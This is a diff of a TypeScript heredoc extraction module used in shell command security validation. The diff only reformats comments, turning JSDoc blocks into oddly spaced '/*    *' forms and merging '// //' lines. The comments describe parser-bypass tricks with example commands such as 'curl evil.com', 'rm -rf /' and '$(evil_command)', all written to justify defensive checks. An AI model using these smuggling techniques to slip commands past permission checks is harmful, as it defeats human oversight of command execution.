@@ -1,4 +1,4 @@
-/**
+/*    *
  * Heredoc extraction and restoration utilities.
  *
  * The shell-quote library parses `<<` as two separate `<` redirect operators,
@@ -22,23 +22,23 @@
  * approval for each apparent subcommand.
  *
  * @module
- */
+     */
 
 import { randomBytes } from 'crypto'
 
 const HEREDOC_PLACEHOLDER_PREFIX = '__HEREDOC_'
 const HEREDOC_PLACEHOLDER_SUFFIX = '__'
 
-/**
+/*    *
  * Generates a random hex string for placeholder uniqueness.
  * This prevents collision when command text literally contains "__HEREDOC_N__".
- */
+     */
 function generatePlaceholderSalt(): string {
   // Generate 8 random bytes as hex (16 characters)
   return randomBytes(8).toString('hex')
 }
 
-/**
+/*    *
  * Regex pattern for matching heredoc start syntax.
  *
  * Two alternatives handle quoted vs unquoted delimiters differently:
@@ -65,34 +65,34 @@ function generatePlaceholderSalt(): string {
  *
  * Note: Uses [ \t]* (not \s*) to avoid matching across newlines, which would be
  * a security issue (could hide commands between << and the delimiter).
- */
+     */
 const HEREDOC_START_PATTERN =
   // eslint-disable-next-line custom-rules/no-lookbehind-regex -- gated by command.includes('<<') at extractHeredocs() entry
   /(?<!<)<<(?!<)(-)?[ \t]*(?:(['"])(\\?\w+)\2|\\?(\w+))/
 
 export type HeredocInfo = {
-  /** The full heredoc text including << operator, delimiter, content, and closing delimiter */
+  /*    * The full heredoc text including << operator, delimiter, content, and closing delimiter     */
   fullText: string
-  /** The delimiter word (without quotes) */
+  /*    * The delimiter word (without quotes)     */
   delimiter: string
-  /** Start position of the << operator in the original command */
+  /*    * Start position of the << operator in the original command     */
   operatorStartIndex: number
-  /** End position of the << operator (exclusive) - content on same line after this is preserved */
+  /*    * End position of the << operator (exclusive) - content on same line after this is preserved     */
   operatorEndIndex: number
-  /** Start position of heredoc content (the newline before content) */
+  /*    * Start position of heredoc content (the newline before content)     */
   contentStartIndex: number
-  /** End position of heredoc content including closing delimiter (exclusive) */
+  /*    * End position of heredoc content including closing delimiter (exclusive)     */
   contentEndIndex: number
 }
 
 export type HeredocExtractionResult = {
-  /** The command with heredocs replaced by placeholders */
+  /*    * The command with heredocs replaced by placeholders     */
   processedCommand: string
-  /** Map of placeholder string to original heredoc info */
+  /*    * Map of placeholder string to original heredoc info     */
   heredocs: Map<string, HeredocInfo>
 }
 
-/**
+/*    *
  * Extracts heredocs from a command string and replaces them with placeholders.
  *
  * This allows shell-quote to parse the command without mangling heredoc syntax.
@@ -109,7 +109,7 @@ export type HeredocExtractionResult = {
  * // result.processedCommand === "cat __HEREDOC_0_a1b2c3d4__" (salt varies)
  * // result.heredocs has the mapping to restore later
  * ```
- */
+     */
 export function extractHeredocs(
   command: string,
   options?: { quotedOnly?: boolean },
@@ -128,14 +128,13 @@ export function extractHeredocs(
   // rather than risk extracting a heredoc with incorrect boundaries.
   // This is defense-in-depth: each construct below has caused or could
   // cause a security bypass if we attempt extraction.
-  //
-  // Specifically, we bail if the command contains:
+  // // Specifically, we bail if the command contains:
   // 1. $'...' or $"..." (ANSI-C / locale quoting — our quote tracker
-  //    doesn't handle the $ prefix, would misparse the quotes)
+  // doesn't handle the $ prefix, would misparse the quotes)
   // 2. Backtick command substitution (backtick nesting has complex parsing
-  //    rules, and backtick acts as shell_eof_token for PST_EOFTOKEN in
-  //    make_cmd.c:606, enabling early heredoc closure that our parser
-  //    can't replicate)
+  // rules, and backtick acts as shell_eof_token for PST_EOFTOKEN in
+  // make_cmd.c:606, enabling early heredoc closure that our parser
+  // can't replicate)
   if (/\$['"]/.test(command)) {
     return { processedCommand: command, heredocs }
   }
@@ -184,30 +183,25 @@ export function extractHeredocs(
   let match: RegExpExecArray | null
 
   // Incremental quote/comment scanner state.
-  //
-  // The regex walks forward through the command, and match.index is monotonically
+  // // The regex walks forward through the command, and match.index is monotonically
   // increasing. Previously, isInsideQuotedString and isInsideComment each
   // re-scanned from position 0 on every match — O(n²) when the heredoc body
   // contains many `<<` (e.g. C++ with `std::cout << ...`). A 200-line C++
   // heredoc hit ~3.7ms per extractHeredocs call, and Bash security validation
   // calls extractHeredocs multiple times per command.
-  //
-  // Instead, track quote/comment/escape state incrementally and advance from
+  // // Instead, track quote/comment/escape state incrementally and advance from
   // the last scanned position. This preserves the OLD helpers' exact semantics:
-  //
-  //   Quote state (was isInsideQuotedString) is COMMENT-BLIND — it never sees
-  //   `#` and never skips characters for being "in a comment". Inside single
-  //   quotes, everything is literal. Inside double quotes, backslash escapes
-  //   the next char. An unquoted backslash run of odd length escapes the next
-  //   char.
-  //
-  //   Comment state (was isInsideComment) observes quote state (# inside quotes
-  //   is not a comment) but NOT the reverse. The old helper used a per-call
-  //   `lineStart = lastIndexOf('\n', pos-1)+1` bound on which `#` to consider;
-  //   equivalently, any physical `\n` clears comment state — including `\n`
-  //   inside quotes (since lastIndexOf was quote-blind).
-  //
-  // SECURITY: Do NOT let comment mode suppress quote-state updates. If `#` put
+  // //   Quote state (was isInsideQuotedString) is COMMENT-BLIND — it never sees
+  // `#` and never skips characters for being "in a comment". Inside single
+  // quotes, everything is literal. Inside double quotes, backslash escapes
+  // the next char. An unquoted backslash run of odd length escapes the next
+  // char.
+  // //   Comment state (was isInsideComment) observes quote state (# inside quotes
+  // is not a comment) but NOT the reverse. The old helper used a per-call
+  // `lineStart = lastIndexOf('\n', pos-1)+1` bound on which `#` to consider;
+  // equivalently, any physical `\n` clears comment state — including `\n`
+  // inside quotes (since lastIndexOf was quote-blind).
+  // // SECURITY: Do NOT let comment mode suppress quote-state updates. If `#` put
   // the scanner in a mode that skipped quote chars, then `echo x#"\n<<...`
   // (where bash treats `#` as part of the word `x#`, NOT a comment) would
   // report the `<<` as unquoted and EXTRACT it — hiding content from security
@@ -377,22 +371,19 @@ export function extractHeredocs(
     // In bash, heredoc content starts on the NEXT LINE after the operator.
     // Any content on the same line after <<EOF (like " && echo done") is part
     // of the command, not the heredoc content.
-    //
-    // SECURITY: The "same line" must be the LOGICAL command line, not the
+    // // SECURITY: The "same line" must be the LOGICAL command line, not the
     // first physical newline. Multi-line quoted strings extend the logical
     // line — bash waits for the quote to close before starting to read the
     // heredoc body. A quote-blind `indexOf('\n')` finds newlines INSIDE
     // quoted strings, causing the body to start too early.
-    //
-    // Exploit: `echo <<'EOF' '${}\n' ; curl evil.com\nEOF`
-    //   - The `\n` inside `'${}\n'` is quoted (literal newline in a string arg)
-    //   - Bash: waits for `'` to close → logical line is
-    //     `echo <<'EOF' '${}\n' ; curl evil.com` → heredoc body = `EOF`
-    //   - Our old code: indexOf('\n') finds the quoted newline → body starts
-    //     at `' ; curl evil.com\nEOF` → curl swallowed into placeholder →
-    //     NEVER reaches permission checks.
-    //
-    // Fix: scan forward from operatorEndIndex using quote-state tracking,
+    // // Exploit: `echo <<'EOF' '${}\n' ; curl evil.com\nEOF`
+    // - The `\n` inside `'${}\n'` is quoted (literal newline in a string arg)
+    // - Bash: waits for `'` to close → logical line is
+    // `echo <<'EOF' '${}\n' ; curl evil.com` → heredoc body = `EOF`
+    // - Our old code: indexOf('\n') finds the quoted newline → body starts
+    // at `' ; curl evil.com\nEOF` → curl swallowed into placeholder →
+    // NEVER reaches permission checks.
+    // // Fix: scan forward from operatorEndIndex using quote-state tracking,
     // finding the first newline that's NOT inside a quoted string. Same
     // quote-tracking semantics as advanceScan (already used to validate
     // the `<<` operator position above).
@@ -442,10 +433,10 @@ export function extractHeredocs(
     // Security: Check for backslash-newline continuation at the end of the
     // same-line content (text between the operator and the newline). In bash,
     // `\<newline>` joins lines BEFORE heredoc parsing — so:
-    //   cat <<'EOF' && \
-    //   rm -rf /
-    //   content
-    //   EOF
+    // cat <<'EOF' && \
+    // rm -rf /
+    // content
+    // EOF
     // bash joins to `cat <<'EOF' && rm -rf /` (rm is part of the command line),
     // then heredoc body = `content`. Our extractor runs BEFORE continuation
     // joining (commands.ts:82), so it would put `rm -rf /` in the heredoc body,
@@ -503,12 +494,10 @@ export function extractHeredocs(
       // a line STARTS with the delimiter and contains the shell_eof_token
       // (`)`, `}`, or backtick) anywhere after it. Our parser only does exact
       // line matching, so this discrepancy could hide smuggled commands.
-      //
-      // Paranoid extension: also bail on bash metacharacters (|, &, ;, (, <,
+      // // Paranoid extension: also bail on bash metacharacters (|, &, ;, (, <,
       // >) after the delimiter, which could indicate command syntax from a
       // parsing discrepancy we haven't identified.
-      //
-      // For <<- heredocs, bash strips leading tabs before this check.
+      // // For <<- heredocs, bash strips leading tabs before this check.
       const eofCheckLine = isDash ? line.replace(/^\t*/, '') : line
       if (
         eofCheckLine.length > delimiter.length &&
@@ -528,8 +517,7 @@ export function extractHeredocs(
     // record its content range for nesting checks but do NOT add it to
     // heredocMatches. This ensures quoted "heredocs" inside its body are
     // correctly rejected by the insideSkipped check on subsequent iterations.
-    //
-    // CRITICAL: We do this BEFORE the closingLineIndex === -1 check. If the
+    // // CRITICAL: We do this BEFORE the closingLineIndex === -1 check. If the
     // unquoted heredoc has no closing delimiter, bash still treats everything
     // to end-of-input as the heredoc body (and expands $() within it). We
     // must block extraction of any subsequent quoted "heredoc" that falls
@@ -569,16 +557,15 @@ export function extractHeredocs(
     // share a line, their bodies appear SEQUENTIALLY (first's body, then
     // second's). Both compute contentStartIndex from the SAME newline, so the
     // second's body search walks through the first's body. For:
-    //   cat <<EOF <<'SAFE'
-    //   $(evil_command)
-    //   EOF
-    //   safe body
-    //   SAFE
+    // cat <<EOF <<'SAFE'
+    // $(evil_command)
+    // EOF
+    // safe body
+    // SAFE
     // ...the quoted <<'SAFE' would incorrectly extract lines 2-4 as its body,
     // swallowing `$(evil_command)` (which bash EXECUTES via the unquoted
     // <<EOF's expansion) into the placeholder, hiding it from validators.
-    //
-    // The insideSkipped check above doesn't catch this because the quoted
+    // // The insideSkipped check above doesn't catch this because the quoted
     // operator's startIndex is on the command line BEFORE contentStart.
     // The contentStartPositions dedup check below doesn't catch it because the
     // skipped heredoc is in skippedHeredocRanges, not topLevelHeredocs.
@@ -686,10 +673,10 @@ export function extractHeredocs(
   return { processedCommand, heredocs }
 }
 
-/**
+/*    *
  * Restores heredoc placeholders back to their original content in a single string.
  * Internal helper used by restoreHeredocs.
- */
+     */
 function restoreHeredocsInString(
   text: string,
   heredocs: Map<string, HeredocInfo>,
@@ -701,13 +688,13 @@ function restoreHeredocsInString(
   return result
 }
 
-/**
+/*    *
  * Restores heredoc placeholders in an array of strings.
  *
  * @param parts - Array of strings that may contain heredoc placeholders
  * @param heredocs - The map of placeholders from `extractHeredocs`
  * @returns New array with placeholders replaced by original heredoc content
- */
+     */
 export function restoreHeredocs(
   parts: string[],
   heredocs: Map<string, HeredocInfo>,
@@ -719,7 +706,7 @@ export function restoreHeredocs(
   return parts.map(part => restoreHeredocsInString(part, heredocs))
 }
 
-/**
+/*    *
  * Checks if a command contains heredoc syntax.
  *
  * This is a quick check that doesn't validate the heredoc is well-formed,
@@ -727,7 +714,7 @@ export function restoreHeredocs(
  *
  * @param command - The shell command string
  * @returns true if the command appears to contain heredoc syntax
- */
+     */
 export function containsHeredoc(command: string): boolean {
   return HEREDOC_START_PATTERN.test(command)
 }
